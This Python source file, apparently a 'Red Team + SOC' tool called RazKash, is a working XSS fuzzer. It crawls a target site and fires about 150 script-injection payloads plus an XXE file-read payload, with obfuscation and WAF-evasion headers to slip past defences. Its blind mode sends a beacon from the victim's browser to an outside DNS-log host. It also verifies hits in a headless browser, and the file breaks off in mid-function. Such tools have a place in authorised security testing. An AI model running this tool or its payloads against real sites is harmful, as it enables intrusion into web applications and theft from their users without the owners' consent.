#!/usr/bin/env python3
# =============================================================================
# RazKash 𝕏SS AI Fuzzer · (Red Team + SOC Version)  
# Version: 2025-05-10, v9.2 Enterprise
# Author : Haroon Ahmad Awan · CyberZeus (mrharoonawan@gmail.com)
# =============================================================================

import os
import re
import ssl
import sys
import json
import time
import random
import string
import argparse
import warnings
import logging
import base64
import threading
import contextlib
import codecs
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import List, Dict, Any
from difflib import SequenceMatcher
from concurrent.futures import ThreadPoolExecutor

import urllib.parse
import requests
from requests.adapters import HTTPAdapter
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

import torch
from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log

# Optional: Playwright & websocket
try:
    from playwright.sync_api import sync_playwright, Request as PWReq
except ImportError:
    sync_playwright = None

try:
    import websocket
except ImportError:
    websocket = None

# ─────────────────────────────────────────────────────────────────────────────
#                              CONFIG
# ─────────────────────────────────────────────────────────────────────────────

VER               = "9.2-omni-enterprise (2025-05-10, merged build)"
MODEL             = "microsoft/codebert-base"
DNSLOG_DOMAIN     = "ugxllx.dnslog.cn"
LOGFILE           = Path("razkash_findings.md")

TOP_K             = 7
DEF_THREADS       = 16
MAX_STATIC_PAGES  = 300
MAX_NESTED_DEPTH  = 5

RATE_LIMIT_SLEEP  = 0.05
SESSION_SPLICE_MS = 100
JITTER_MIN_MS     = 20
JITTER_MAX_MS     = 200

VERIFY_TIMEOUT    = 9000
HTTP_TIMEOUT      = 12
HEADLESS_WAIT     = 3500

WAF_SPOOF_HEADERS = [
    {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
    {"User-Agent": "curl/7.68.0"},
    {"User-Agent": "Wget/1.20.3 (linux-gnu)"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
]

# ─────────────────────────────────────────────────────────────────────────────
#                              ARGUMENTS
# ─────────────────────────────────────────────────────────────────────────────

ap = argparse.ArgumentParser(description="RazKash v9.2-omni-enterprise · Ultimate AI XSS Omnifuzzer")
mx = ap.add_mutually_exclusive_group()
mx.add_argument("--reflected", action="store_true", help="Only reflected XSS")
mx.add_argument("--stored",    action="store_true", help="Only stored XSS")
mx.add_argument("--blind",     action="store_true", help="Only blind XSS")
mx.add_argument("--invent",    action="store_true", help="Invent new AI-driven payloads (add 'MASK' placeholder)")
ap.add_argument("-u","--url",      help="Target root URL")
ap.add_argument("--autotest",      action="store_true", help="Use built-in vulnerable labs for quick testing")
ap.add_argument("--login-url",     help="Optional login endpoint URL")
ap.add_argument("--username",      help="Optional username for login")
ap.add_argument("--password",      help="Optional password for login")
ap.add_argument("--csrf-field",    default="csrf", help="CSRF field name (for form-based login)")
ap.add_argument("--threads",       type=int, default=DEF_THREADS, help="Number of fuzzing threads")
ap.add_argument("--max-pages",     type=int, default=MAX_STATIC_PAGES, help="Max static pages to crawl")
ap.add_argument("--nested-depth",  type=int, default=MAX_NESTED_DEPTH, help="Max depth for nested iframes")
ap.add_argument("--simulate-spa",  action="store_true", help="Simulate SPA by clicking links (Playwright)")
ap.add_argument("--crawl-iframes", action="store_true", help="Crawl iframes as well")
ap.add_argument("--detect-waf",    action="store_true", help="Enable passive WAF detection attempt")
ap.add_argument("--polymorph",     action="store_true", help="Obfuscate payloads with random transformations")
ap.add_argument("--headed",        action="store_true", help="Run Playwright in headed mode for XSS popups")
ap.add_argument("--debug",         action="store_true", help="Enable debug logging")
args = ap.parse_args()
DEBUG = args.debug

logging.basicConfig(
    level=logging.DEBUG if DEBUG else logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s"
)
warnings.filterwarnings("ignore")
hf_log.set_verbosity_error()
os.environ["TRANSFORMERS_NO_TQDM"] = "1"
ssl._create_default_https_context = ssl._create_unverified_context

def dbg(msg: str):
    if DEBUG:
        logging.debug(msg)

# ─────────────────────────────────────────────────────────────────────────────
#                              UTILITIES
# ─────────────────────────────────────────────────────────────────────────────

def randstr(n=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def jitter(a=JITTER_MIN_MS, b=JITTER_MAX_MS):
    time.sleep(random.uniform(a/1000, b/1000))

def session_splice():
    time.sleep(SESSION_SPLICE_MS/1000)

def rate_limit():
    time.sleep(RATE_LIMIT_SLEEP)

def smart_url(u: str) -> str:
    if u.startswith(("http://","https://")):
        return u
    for p in ("https://","http://"):
        try:
            if requests.head(p+u, timeout=3, verify=False).status_code < 500:
                return p+u
        except:
            pass
    return "http://" + u

def random_headers() -> Dict[str,str]:
    ua = UserAgent()
    h = {"User-Agent": ua.random}
    if args.detect_waf:
        h.update(random.choice(WAF_SPOOF_HEADERS))
    return h

# ─────────────────────────────────────────────────────────────────────────────
#                         AI MODEL (MASK FILLING)
# ─────────────────────────────────────────────────────────────────────────────

device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
tok    = AutoTokenizer.from_pretrained(MODEL)
mdl    = AutoModelForMaskedLM.from_pretrained(MODEL).to(device).eval()
MASK_T, MASK_ID = tok.mask_token, tok.mask_token_id

def ai_mutate(template: str) -> str:
    s = template
    while "MASK" in s:
        ids = tok(s.replace("MASK", MASK_T, 1), return_tensors="pt").input_ids.to(device)
        with torch.no_grad():
            logits = mdl(ids).logits
        pos = (ids == MASK_ID).nonzero(as_tuple=True)[1][0]
        token_id = random.choice(logits[0,pos].topk(TOP_K).indices.tolist())
        w = tok.decode(token_id).strip() or "alert(1)"
        s = s.replace("MASK", w, 1)
    return s

# ─────────────────────────────────────────────────────────────────────────────
#                       POLYMORPHIC OBFUSCATION
# ─────────────────────────────────────────────────────────────────────────────

obfuscation_methods = [
    lambda p: p,
    lambda p: "".join(f"\\x{ord(c):02x}" for c in p) if p else p,
    lambda p: "".join(f"\\u{ord(c):04x}" for c in p) if p else p,
    lambda p: base64.b64encode(p.encode()).decode(errors='ignore') if p else p,
    lambda p: p.encode('utf-16').decode(errors='ignore') if p else p,
    lambda p: codecs.encode(p, 'rot_13') if p else p,
    lambda p: urllib.parse.quote(p) if p else p,
    lambda p: p.replace('<','&lt;').replace('>','&gt;') if p else p,
    lambda p: p.replace('"','&quot;').replace("'",'&#39;') if p else p,
    lambda p: "".join(f"\\{c}" for c in p) if p else p,
    lambda p: "".join(f"%{ord(c):02X}" for c in p) if p else p,
    lambda p: "".join(f"&#x{ord(c):X};" for c in p) if p else p,
    lambda p: "".join(f"&#{ord(c)};" for c in p) if p else p,
    lambda p: "".join(f"{c}/**/" for c in p) if p else p,
    lambda p: p[::-1] if p else p,
    lambda p: p.upper() if p else p,
    lambda p: p.lower() if p else p,
    lambda p: p.swapcase() if p else p,
    lambda p: p.replace('\x00','') if p else p,
]

def polymorph(payload: str) -> str:
    return random.choice(obfuscation_methods)(payload)

# ─────────────────────────────────────────────────────────────────────────────
#                     BASE XSS PAYLOADS + INVENT OPTION
# ─────────────────────────────────────────────────────────────────────────────

stored_payloads = [
    # 1–10: Simple <script> and common payloads
    '<script>alert(1)</script>',
    "<script>alert('XSS')</script>",
    '"><script>alert(document.domain)</script>',
    '<SCRIPT SRC=//example.com/xss.js></SCRIPT>',
    "<script>confirm('XSS')</script>",
    '<SCRIPT>alert("XSS");</SCRIPT>',
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<script>console.log('XSS');alert('XSS');</script>",
    '<script type="text/javascript">alert(/XSS/)</script>',
    "';alert('XSS');//",

    # 11–20: Image / Event Handler
    "<img src=x onerror=alert('XSS')>",
    "<img src=1 onerror=alert(/XSS/)>",
    '"><img src=x onerror=alert(\'XSS\')>',
    "<img src=\"javascript:alert('XSS')\">",
    "<img src=\"invalid\" onerror=\"alert('XSS')\">",
    '<IMG LOWSRC="javascript:alert(\'XSS\')">',
    "<img src=javascript:alert('XSS')>",
    "<img src=1 onload=alert(1)>",
    '"><img src=doesnotexist onerror=confirm(\'XSS\')>',
    "<img src=data: onerror=alert('XSS')>",

    # 21–30: Anchor / javascript: Schemes
    "<a href=\"javascript:alert('XSS')\">Click Me</a>",
    '"><a href="javascript:alert(/XSS/)">link</a>',
    "<a href=javascript:alert('XSS')>XSS Link</a>",
    "<a href=JaVaScRiPt:alert('XSS')>mixed-case link</a>",
    "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>Base64Load</a>",
    "<a href=javascript:console.log('XSS');alert('XSS')>Debug+Alert</a>",
    "<a href=\"ja    vascript:alert('XSS')\">whitespace trick</a>",
    "<a href=\"javascript:eval('alert(XSS)')\">eval link</a>",
    "<a href=\"javascript:prompt('Stored XSS')\">Prompt link</a>",
    "\"><a href=javascript:alert('XSS') style=position:absolute;top:0;left:0>Overlay</a>",

    # 31–40: Iframe / Form / Body
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
    "<form action=\"javascript:alert('XSS')\"><input type=submit></form>",
    "<body onload=alert('XSS')>",
    "<body background=javascript:alert('XSS')>",
    "<form><button formaction=\"javascript:alert('XSS')\">XSS</button></form>",
    "\"><iframe src=javascript:alert(1)>",
    "<iframe/onload=alert('XSS')>",
    "<form action=\"\" onsubmit=alert(\"XSS\")><input type=submit value=\"Go\"></form>",
    "<BODY ONRESIZE=alert(\"XSS\")>resize me</BODY>",

    # 41–50: SVG / XML / MathML
    '<svg onload=alert("XSS")></svg>',
    '<svg><script>alert("XSS")</script></svg>',
    "<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>",
    "<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>",
    "<svg><p><style><img src=x onerror=alert(\"XSS\")></p></svg>",
    '<math><mtext></mtext><annotation encoding="application/ecmascript">alert("XSS")</annotation></math>',
    "<?xml version=\"1.0\"?><root><![CDATA[<script>alert('XSS')</script>]]></root>",
    "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg><a xlink:href=\"javascript:alert('XSS')\">CLICK</a></svg>",
    "\"><svg/onload=confirm('XSS')>",

    # 51–60: CSS, Meta
    '<style>*{background:url("javascript:alert(\'XSS\')");}</style>',
    "<style>@import 'javascript:alert(\"XSS\")';</style>",
    "<style>li {list-style-image: url(\"javascript:alert('XSS')\");}</style><ul><li>Test",
    "<div style=\"width: expression(alert('XSS'))\">",
    '<style>body:after { content:"XSS"; }</style>',
    "<style onload=alert(\"XSS\")></style>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
    "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
    "<style>@keyframes xss { from {color: red;} to {color: green;} } div { animation: xss 5s infinite; }</style>",
    "<meta charset=\"x-unknown\" content=\"javascript:alert('XSS')\">",

    # 61–70: Event Handlers & Rare Tags
    "<img src=x onmouseover=alert('XSS')>",
    "<marquee onstart=alert('XSS')>Scrolling Text</marquee>",
    "<table background=\"javascript:alert('XSS')\"><tr><td>XSS!</td></tr></table>",
    "<audio src onerror=alert('XSS')></audio>",
    "<video src onerror=confirm('XSS')></video>",
    "<object data=\"javascript:alert('XSS')\"></object>",
    "<embed src=\"javascript:alert('XSS')\"></embed>",
    "<applet code=javascript:alert('XSS')></applet>",
    "<details ontoggle=alert('XSS')>Click to toggle</details>",
    "<textarea autofocus onfocus=alert(\"XSS\")>Focus me</textarea>",

    # 71–80: Attribute Escapes
    "\" autofocus onfocus=alert('XSS') foo=\"",
    "' onmouseover=alert(\"XSS\") '",
    "<!--\"><script>alert('XSS')</script>",
    "-->\"><script>alert('XSS')</script>",
    "<!--#exec cmd=\"/bin/echo '<script>alert(XSS)</script>'\"-->",
    "<title onpropertychange=alert('XSS')>TitleXSS</title>",
    "<blink onclick=alert(\"XSS\")>Blink me</blink>",
    "\"--><script>alert('XSS')</script><!--\"",
    "'-->\"><img src=x onerror=alert(\"XSS\")>",
    "--><svg/onload=alert('XSS')><!",

    # 81–90: javascript: / data URIs
    "javascript:alert(\"XSS\")",
    "JaVaScRiPt:alert(\"XSS\")",
    "data:text/html,<script>alert(\"XSS\")</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "\"><iframe srcdoc=\"data:text/html,<script>alert('XSS')</script>\"></iframe>",
    "\"><script>window.location='javascript:alert(\"XSS\")'</script>",
    "<a href=\"data:text/html;charset=utf-8,<script>alert(1)</script>\">Data Link</a>",
    "<img src=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+>",
    "\"><object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
    "<video src=\"data:video/mp4;base64,invalid\" onerror=\"alert('XSS')\"></video>",

    # 91–100: Obfuscated
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "\"><script>alert(unescape('%58%53%53'))</script>",
    "<script>eval(\"&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;\")</script>",
    "<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>",
    "<iframe srcdoc=\"%3Cscript%3Ealert('XSS')%3C%2Fscript%3E\"></iframe>",
    "\"><img src=x oneRrOr=eval('al'+'ert(1)')>",
    "<img src=x onerror=\"this['al'+'ert']('XSS')\">",
    "<svg onload='fetch(\"data:,\"+String.fromCharCode(97,108,101,114,116,40,49,41))'></svg>",
    "<style>*{background-image:url(\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\")} </style>",
    "<img src=1 onerror='eval(decodeURIComponent(\"%61%6c%65%72%74%28%31%29\"))'>"
]
    
BASE_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')" />',
    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
    '"><script>alert("XSS")</script>',
    '"><img src=x onerror=alert("XSS")>',
    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
    'javascript:alert("XSS")',
    'javascript:confirm("XSS")',
    'javascript:eval("alert(\'XSS\')")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
    '<img src=x onerror=confirm("XSS")>',
    '<img src=x onerror=eval("alert(\'XSS\')")>',
    '\'; alert(String.fromCharCode(88,83,83))//',
    '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
    '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
    '<img foo=a src="javascript:alert(\'XSS\')">',
    '<img foo=a onerror="alert(\'XSS\')">',
    '<img src="http://example.com/image.jpg">',
    '<img src="">',
    '<img>',
    '<img src=x onerror=alert("XSS")>',
    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
    '&#34;><img src=x onerror=alert(\'XSS\')>',
    '&#34><img src=x onerror=alert(\'XSS\')>',
    '&#x22><img src=x onerror=alert(\'XSS\')>',
    '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
    '<img src="vbscript:alert(\'XSS\')">',
    '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
    '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
    '<BODY ONLOAD=alert(\'XSS\')>',
    '<img onmouseover="alert(\'XSS\')" src="x">',
    '<s<Sc<script>ript>alert(\'XSS\')</script>',
    '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
    '<TD BACKGROUND="javascript:alert(\'XSS\')">',
    '<DIV STYLE="width: expression(alert(\'XSS\'));">',
    '<BASE HREF="javascript:alert(\'XSS\');//">',
    '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
    '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
    '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
    '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
]
if args.invent:
    # Let the AI fill in 'MASK'
    BASE_PAYLOADS.append('MASK')

PAYLOADS = BASE_PAYLOADS.copy()

# ─────────────────────────────────────────────────────────────────────────────
#                        ERROR DETECTION / PATTERNS
# ─────────────────────────────────────────────────────────────────────────────

SQL_ERROR_RE = re.compile(r"(SQL syntax|MySQL|syntax error|unclosed quotation|InnoDB|PostgreSQL)", re.I)

# ─────────────────────────────────────────────────────────────────────────────
#                            VERIFICATION
# ─────────────────────────────────────────────────────────────────────────────

def verify(url: str, method: str, data: Any, is_json: bool=False) -> bool:
    """
    Launches a headless or headed browser to detect if any script
    event (alert, confirm, prompt, etc.) was triggered.
    """
    if not sync_playwright:
        return False
    try:
        with sync_playwright() as p:
            bw = p.chromium.launch(
                headless=not args.headed,
                args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"]
            )
            ctx = bw.new_context(ignore_https_errors=True, user_agent=UserAgent().random)
            page = ctx.new_page()

            # Inject a minimal script to detect XSS
            page.add_init_script("""
                window._xss_triggered = false;
                const mark = () => { window._xss_triggered = true; };
                ['alert','confirm','prompt'].forEach(fn => {
                    const _orig = window[fn];
                    window[fn] = (...args) => { mark(); return _orig(...args); };
                });
                document.addEventListener('securitypolicyviolation', mark);
            """)
            page.on("dialog", lambda d: (d.dismiss(), page.evaluate("window._xss_triggered = true")))

            if method.upper() == "GET":
                q = urllib.parse.urlencode(data)
                page.goto(f"{url}?{q}", timeout=VERIFY_TIMEOUT, wait_until="networkidle")
            else:
                page.goto(url, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
                headers = {"Content-Type": "application/json"} if is_json else {"Content-Type": "application/x-www-form-urlencoded"}
                body    = json.dumps(data) if is_json else urllib.parse.urlencode(data)
                page.evaluate("(u,h,b) => fetch(u,{method:'POST',headers:h,body:b})", url, headers, body)

            page.wait_for_timeout(HEADLESS_WAIT)
            hit = page.evaluate("window._xss_triggered")
            ctx.close()
            bw.close()
            return bool(hit)
    except Exception as ex:
        dbg(f"[verify] {ex}")
        return False

# ─────────────────────────────────────────────────────────────────────────────
#                            LOGGING
# ─────────────────────────────────────────────────────────────────────────────

if not LOGFILE.exists():
    LOGFILE.write_text(f"# RazKash Findings v{VER}\n\n", "utf-8")

_hits = set()
log_lock = threading.Lock()

def log_hit(url, method, payload, params=None):
    params = params or []
    entry = f"- **XSS** {method} `{url}` param={params} payload=`{payload}`\n"
    with log_lock:
        if entry in _hits:
            return
        _hits.add(entry)
        LOGFILE.write_text(LOGFILE.read_text("utf-8") + entry, "utf-8")
    logging.info(entry.strip())

# ─────────────────────────────────────────────────────────────────────────────
#                          SESSION / AUTH
# ─────────────────────────────────────────────────────────────────────────────

def get_authenticated_session():
    s = requests.Session()
    if args.login_url and args.username and args.password:
        if args.login_url.endswith("/rest/user/login"):
            # JSON-based login
            h = random_headers()
            h["Content-Type"] = "application/json"
            try:
                r = s.post(args.login_url, json={"email": args.username, "password": args.password},
                           headers=h, timeout=HTTP_TIMEOUT, verify=False)
                j = r.json()
                token = j.get("token") or j.get("authentication",{}).get("token")
                if token:
                    s.headers.update({"Authorization": f"Bearer {token}"})
            except:
                pass
        else:
            # HTML form-based login
            r0 = s.get(args.login_url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
            csrf_val = re.search(f'name="{args.csrf_field}" value="([^"]+)"', r0.text)
            data = {}
            if csrf_val:
                data[args.csrf_field] = csrf_val.group(1)
            data.update({"username": args.username, "password": args.password})
            s.post(args.login_url, data=data, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)

    s.mount("https://", HTTPAdapter(pool_connections=50, pool_maxsize=50))
    s.mount("http://",  HTTPAdapter(pool_connections=50, pool_maxsize=50))
    return s

SESSION = get_authenticated_session()

# ─────────────────────────────────────────────────────────────────────────────
#                          GRAPHQL HELPERS
# ─────────────────────────────────────────────────────────────────────────────

INTROSPECTION = """ query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      kind name
      fields { name args { name type { kind name ofType { kind } } } }
    }
  }
}
"""

def discover_graphql_ops(ep):
    try:
        j = SESSION.post(ep, json={"query": INTROSPECTION}, timeout=HTTP_TIMEOUT, verify=False).json()
        schema = j["data"]["__schema"]
        ops = []
        for kind in ("queryType","mutationType"):
            root = schema.get(kind)
            if not root:
                continue
            for t in schema["types"]:
                if t["name"] == root["name"]:
                    for f in t["fields"]:
                        # string args
                        arg_names = [a["name"] for a in f["args"] if a["type"]["name"] == "String"]
                        if arg_names:
                            ops.append((f["name"], arg_names))
        return ops
    except:
        return []

def fuzz_graphql(ep):
    ops = discover_graphql_ops(ep)
    for name, args_ in ops:
        for a in args_:
            payload = '<img src=x onerror=alert(1)>'
            try:
                SESSION.post(
                    ep,
                    json={"query": f"mutation{{{name}({a}:\"{payload}\"){{__typename}}}}"},
                    timeout=HTTP_TIMEOUT,
                    verify=False
                )
                # Basic attempt, not verified in a browser here
            except Exception as ex:
                dbg(f"[fuzz_graphql] {ex}")

# ─────────────────────────────────────────────────────────────────────────────
#                            CRAWLING
# ─────────────────────────────────────────────────────────────────────────────

def mine_js(url, host):
    """Extract possible subrequests from JS content."""
    found = []
    try:
        r = SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        txt = r.text
        js_call_re = re.compile(
            r'(?:fetch\(["\']|axios\.\w+\(["\']|XHR\.open\(["\'](GET|POST)["\'],\s*)(/[^"\']+\.(?:js|php|asp|json|graphql)(?:\?[^"\']*)?)["\']',
            re.IGNORECASE
        )
        js_url_re  = re.compile(r'["\'](/[^"\']+\.(?:js|php|asp|json|graphql)(?:\?[^"\']*)?)["\']', re.IGNORECASE)

        found += [m[1] for m in js_call_re.findall(txt)]
        found += js_url_re.findall(txt)
    except:
        pass

    out = set()
    for u in found:
        full = urllib.parse.urljoin(url, u)
        if urllib.parse.urlparse(full).netloc.lower() == host:
            out.add(full)
    return list(out)

def misc_assets(root):
    """Look for additional assets like sitemap or robots."""
    base = urllib.parse.urlparse(root)._replace(path="",query="",fragment="").geturl()
    assets = []
    # robots.txt
    try:
        txt = SESSION.get(base + "/robots.txt", headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False).text
        for line in txt.splitlines():
            if line.lower().startswith("sitemap:"):
                assets.append(line.split(":",1)[1].strip())
    except:
        pass
    return assets

def crawl_static(root, cap, depth=0):
    visited = set()
    queue = [root] + misc_assets(root)
    results = []
    host = urllib.parse.urlparse(root).netloc.lower()

    while queue and len(visited) < cap:
        u = queue.pop(0)
        if u in visited:
            continue
        visited.add(u)
        try:
            r = SESSION.get(u, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        except:
            continue
        ct = (r.headers.get("content-type") or "").lower()
        # If JS, mine more links
        if "javascript" in ct:
            for jurl in mine_js(u, host):
                if jurl not in visited:
                    queue.append(jurl)
            continue
        # If not HTML, skip
        if "html" not in ct:
            continue

        soup = BeautifulSoup(r.text, "html.parser")

        # Iframes
        if args.crawl_iframes and depth < args.nested_depth:
            for ifr in soup.find_all("iframe", src=True):
                src = urllib.parse.urljoin(u, ifr["src"])
                if urllib.parse.urlparse(src).netloc.lower() == host:
                    queue.append(src)

        # scripts
        for sc in soup.find_all("script", src=True):
            scr = urllib.parse.urljoin(u, sc["src"])
            if urllib.parse.urlparse(scr).netloc.lower() == host:
                queue.append(scr)

        # anchors
        for a in soup.find_all("a", href=True):
            link = urllib.parse.urljoin(u, a["href"])
            pu   = urllib.parse.urlparse(link)
            if pu.netloc.lower() != host:
                continue
            if link not in visited:
                queue.append(link)
            if pu.query:
                qs = list(urllib.parse.parse_qs(pu.query).keys())
                results.append({"url": pu._replace(query="").geturl(), "method": "GET", "params": qs})

        # forms
        for f in soup.find_all("form"):
            act = urllib.parse.urljoin(u, f.get("action") or u)
            if urllib.parse.urlparse(act).netloc.lower() != host:
                continue
            meth = f.get("method","get").upper()
            ps = [i.get("name") for i in f.find_all(["input","textarea","select"]) if i.get("name")]
            if ps:
                results.append({"url": act, "method": meth, "params": ps})

    return results

def crawl_dynamic(root):
    """Uses Playwright to capture dynamic requests (XHR, fetch) if available."""
    if not sync_playwright:
        return []
    found = []
    seen  = set()
    host  = urllib.parse.urlparse(root).netloc.lower()

    try:
        with sync_playwright() as p:
            br = p.chromium.launch(
                headless=not args.headed,
                args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"]
            )
            ctx = br.new_context(ignore_https_errors=True, user_agent=UserAgent().random)
            page = ctx.new_page()

            def on_req(req):
                u = req.url
                if urllib.parse.urlparse(u).netloc.lower() != host or u in seen:
                    return
                seen.add(u)
                m = req.method.upper()
                hd = req.headers.get("content-type","").lower()
                is_json = ("json" in hd or "graph" in hd)
                try:
                    data = json.loads(req.post_data or "{}")
                except:
                    data = {}
                qs = list(urllib.parse.urlparse(u).query.split("&")) if "?" in u else []
                if data:
                    param_names = list(data.keys())
                else:
                    param_names = [q.split("=")[0] for q in qs if q] or ["payload"]
                found.append({
                    "url": u.split("?", 1)[0],
                    "method": m if m in ("POST","PUT") else "GET",
                    "params": param_names,
                    "json": is_json,
                    "template": data
                })

            page.on("request", on_req)
            page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
            time.sleep(1)

            # (Optional) Could simulate more interactions here if needed

            ctx.close()
            br.close()
    except:
        pass
    return found

# ─────────────────────────────────────────────────────────────────────────────
#                     FUZZING (HTTP & WEBSOCKETS)
# ─────────────────────────────────────────────────────────────────────────────

static_exts = {
    "png","jpg","jpeg","gif","bmp","svg","webp","ico",
    "css","woff","woff2","ttf","eot","otf","mp4","mp3","webm",
    "pdf","zip","rar","7z","tar","gz"
}

def set_deep(obj, path, val):
    """Set a deep key in a nested dict or list, e.g. foo.bar[2].baz."""
    parts = re.split(r'\.|(\[\d+\])', path)
    parts = [p for p in parts if p and p.strip()]
    cur = obj
    for i, part in enumerate(parts):
        is_last = (i == len(parts)-1)
        if part.startswith('[') and part.endswith(']'):
            idx = int(part[1:-1])
            if is_last:
                cur[idx] = val
            else:
                if isinstance(cur[idx], (dict, list)):
                    cur = cur[idx]
                else:
                    cur[idx] = {}
                    cur = cur[idx]
        else:
            if is_last:
                cur[part] = val
            else:
                if part not in cur or not isinstance(cur[part], (dict, list)):
                    cur[part] = {}
                cur = cur[part]

def fuzz_http(t: Dict[str,Any]) -> None:
    # Skip truly static resources by extension
    ext = Path(urllib.parse.urlparse(t["url"]).path).suffix.lstrip('.').lower()
    if ext in static_exts:
        return

    # Throttle to avoid WAF suspicion
    rate_limit()
    session_splice()

    # Probe first
    try:
        probe = {p: "" for p in t["params"]}
        r0 = (SESSION.get if t["method"]=="GET" else SESSION.post)(
            t["url"],
            params=probe if t["method"]=="GET" else None,
            data=probe  if t["method"]=="POST" else None,
            headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False
        )
        if r0.status_code != 200:
            return
        if "image" in (r0.headers.get("content-type","").lower()):
            return
    except:
        return

    # Choose payload set
    if args.blind and DNSLOG_DOMAIN:
        # single blind vector
        templates = [
            f"<script>new Image().src='http://{DNSLOG_DOMAIN}/?p='+encodeURIComponent('{randstr()}')</script>"
        ]
    else:
        templates = PAYLOADS

    for tpl in templates:
        payload = tpl
        if "MASK" in payload:
            payload = ai_mutate(payload)
        if args.polymorph:
            payload = polymorph(payload)

        try:
            if t.get("json") and "template" in t:
                body = json.loads(json.dumps(t["template"]))
                for param in t["params"]:
                    set_deep(body, param, payload)
                resp = SESSION.post(
                    t["url"],
                    json=body,
                    headers={"Content-Type":"application/json"},
                    timeout=HTTP_TIMEOUT,
                    verify=False
                )
                sent_data = body
            else:
                sent_data = {p: payload for p in t["params"]}
                resp = (SESSION.get if t["method"]=="GET" else SESSION.post)(
                    t["url"],
                    params=sent_data if t["method"]=="GET" else None,
                    data=sent_data  if t["method"]=="POST" else None,
                    headers=random_headers(),
                    timeout=HTTP_TIMEOUT,
                    verify=False
                )

            # Basic WAF block check
            if resp.status_code in (403, 429, 503) or any(x in resp.text for x in ("captcha","denied","blocked")):
                continue
            # Skip SQL error pages
            if SQL_ERROR_RE.search(resp.text):
                continue

            # Blind
            if args.blind:
                log_hit(t["url"], "BLIND", payload, t["params"])
                return

            # Reflected or "all" -> verify in a browser
            if verify(t["url"], t["method"], sent_data, t.get("json", False)):
                log_hit(t["url"], t["method"], payload, t["params"])
                return

        except Exception as ex:
            dbg(f"[fuzz_http] {ex}")
        jitter()

def fuzz_ws(t: Dict[str,Any]) -> None:
    """Attempt a WS-based injection if websockets are in use."""
    if not websocket:
        return
    if not t["url"].startswith(("ws://","wss://")):
        return

    url = t["url"]
    params = t.get("params", [])
    tpl = t.get("template") or {}
    marker = randstr()

    try:
        body = json.loads(json.dumps(tpl))
    except:
        body = {}

    if body:
        set_deep(body, random.choice(params), f"<img src onerror=alert('{marker}')>")
    else:
        if params:
            body[random.choice(params)] = f"<svg onload=alert('{marker}')></svg>"
        else:
            body["payload"] = f"<svg onload=alert('{marker}')></svg>"

    payload = json.dumps(body)
    hit = False

    def on_msg(wsapp, msg):
        nonlocal hit
        if marker in msg:
            hit = True

    try:
        wsapp = websocket.WebSocketApp(url, on_message=on_msg, header=random_headers())
